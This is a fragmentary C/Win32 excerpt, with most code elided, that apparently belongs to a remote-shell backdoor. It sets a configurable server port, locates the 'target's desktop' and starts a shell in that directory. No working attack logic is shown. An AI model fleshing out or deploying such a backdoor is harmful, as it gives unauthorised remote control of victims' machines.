...
#define SERVERPORT "27015"  // CHANGE THIS TO YOUR PORT
...
int startup()
{
    ...
    SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktoppath);  // target's desktop directory
...
int shell()
{
    ...
    SetCurrentDirectory((LPCSTR)desktoppath);  // sets directory to the target's desktop to begin with
